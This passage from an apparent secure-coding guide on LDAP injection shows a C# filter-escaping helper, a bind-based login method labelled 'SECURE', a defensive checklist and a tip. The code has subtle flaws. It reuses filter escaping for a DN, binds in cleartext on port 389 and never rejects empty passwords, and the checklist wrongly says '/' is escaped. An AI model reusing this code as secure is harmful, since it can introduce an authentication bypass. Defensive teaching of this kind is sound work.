    private static string EscapeLDAPFilter(string input)
    {
        if (string.IsNullOrEmpty(input)) return "";
        
        var sb = new StringBuilder();
        foreach (char c in input)
        {
            switch (c)
            {
                case '\\': sb.Append("\\5c"); break;
                case '*':  sb.Append("\\2a"); break;
                case '(':  sb.Append("\\28"); break;
                case ')':  sb.Append("\\29"); break;
                case '\0': sb.Append("\\00"); break;
                default:   sb.Append(c); break;
            }
        }
        return sb.ToString();
    }
    
    // SECURE — BIND authentication
    public static bool Authenticate(string username, string password)
    {
        if (!Regex.IsMatch(username, @"^[a-zA-Z0-9._-]+$"))
            return false;
        
        var userDN = $"uid={EscapeLDAPFilter(username)},ou=People,dc=target,dc=com";
        
        try
        {
            using var conn = new LdapConnection("ldapserver:389");
            conn.Credential = new NetworkCredential(userDN, password);
            conn.AuthType = AuthType.Basic;
            conn.Bind(); // Throws if credentials are invalid
            return true;
        }
        catch (LdapException)
        {
            return false;
        }
    }
}
```
::

### Security Checklist

::field-group
  ::field{name="Input Escaping" type="critical"}
  All user input escaped with LDAP filter escaping function before incorporation into filters. Special characters `* ( ) \ NUL /` properly handled.
  ::

  ::field{name="Input Validation" type="critical"}
  Strict allowlist validation on all inputs. Username restricted to `[a-zA-Z0-9._-]`. Type checking enforced. Length limits applied.
  ::

  ::field{name="BIND Authentication" type="critical"}
  Use LDAP BIND operation for authentication instead of searching for password in filter. BIND lets the LDAP server validate credentials securely.
  ::

  ::field{name="Least Privilege Bind Account" type="high"}
  Application uses a restricted bind account with read-only access to necessary attributes only. No access to `userPassword`, `description` on sensitive entries.
  ::

  ::field{name="LDAP ACLs" type="high"}
  Server-side access controls prevent reading sensitive attributes. Anonymous access disabled. Attribute-level permissions configured per user/group.
  ::

  ::field{name="Error Handling" type="high"}
  LDAP errors never exposed to users. Generic error messages returned. Detailed errors logged server-side. Filter syntax never included in responses.
  ::

  ::field{name="LDAPS / StartTLS" type="medium"}
  LDAP communication encrypted via LDAPS (port 636) or StartTLS. Prevents credential sniffing on the wire.
  ::

  ::field{name="Monitoring & Alerting" type="medium"}
  LDAP query logging enabled. Alerts on unusual filter patterns, wildcard abuse, or high query volumes. Failed authentication monitoring active.
  ::
::

::tip
The **most effective defense** against LDAP injection is to use **LDAP BIND authentication** instead of searching for passwords in filters. With BIND, you construct the user's DN (e.g., `uid=username,ou=People,dc=target,dc=com`) and let the LDAP server validate the password — no filter injection is possible because the password never enters a search filter.
::